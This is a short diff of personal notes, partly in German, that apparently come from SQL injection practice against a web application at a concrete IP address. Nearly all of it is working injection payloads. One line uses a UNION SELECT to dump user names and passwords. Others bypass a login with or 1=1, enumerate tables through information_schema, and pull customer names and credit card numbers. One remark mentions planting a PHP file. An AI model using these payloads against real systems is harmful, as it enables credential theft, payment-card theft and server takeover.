@@ -34,3 +34,8 @@ information_schema.columns ;-- -
 http://92.60.14.134:8081/sql/1?category=animal' UNION SELECT user_name,user_password FROM users;-- -
 
 Wenn Datenbank im Root verzeichnis lauft, dann kann ein PHP file eingespielt werden.
+
+M* ') or 1=1--
+M* ') UNION SELECT 1,2,3,4,5-- -
+F* ') union select 1,2,table_name,4,5 from information_schema.tables where table_schema=database()--+ 
+F* ') union select 1,name,creditcard,4,5 from customers -- + --> find the credit cards
